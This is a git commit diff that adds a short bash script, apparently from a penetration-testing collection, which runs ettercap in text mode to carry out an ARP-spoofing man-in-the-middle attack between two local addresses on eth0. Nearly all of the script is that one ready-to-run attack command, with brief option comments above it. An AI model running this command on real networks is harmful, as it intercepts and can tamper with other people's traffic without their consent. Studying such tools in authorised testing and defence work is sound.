081d7a79a79716a266f6cf039df3e1ff7778b8b9
sammysprinkler <168591441+sammysprinkler@users.noreply.github.com>
2024-06-17 13:25:57 -0400

    Update ettercap_mitm.sh

--- Scripts/Attack/Man_in_the_Middle/ettercap_mitm.sh
+++ Scripts/Attack/Man_in_the_Middle/ettercap_mitm.sh
@@ -1,1 +1,10 @@
-.
+#!/bin/bash
+# Ettercap - Man-in-the-Middle attack tool
+# Options:
+# -T : Text mode
+# -q : Quiet mode
+# -i : Interface
+
+# Usage: ettercap -T -q -i <interface> -M arp:remote /<target1>/ /<target2>/
+# Example script
+ettercap -T -q -i eth0 -M arp:remote /192.168.1.1/ /192.168.1.2/
